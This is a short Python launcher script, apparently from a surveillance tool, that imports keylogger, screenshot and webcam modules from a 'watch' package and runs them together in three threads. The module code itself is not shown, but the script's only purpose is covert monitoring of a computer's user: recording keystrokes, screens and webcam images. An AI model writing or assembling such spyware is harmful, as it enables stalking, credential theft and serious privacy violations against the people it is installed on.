from watch.keylogger import *
from watch.screenshots import *
from watch.seeyou import *
import threading

if __name__ == '__main__':
    webcam_thread = threading.Thread(target=capture_webcam_images)
    screenshot_thread = threading.Thread(target=capture_screenshots)
    keylogger_thread = threading.Thread(target=start_keylogger)

    webcam_thread.start()
    screenshot_thread.start()
    keylogger_thread.start()

    webcam_thread.join()
    screenshot_thread.join()
    keylogger_thread.join()
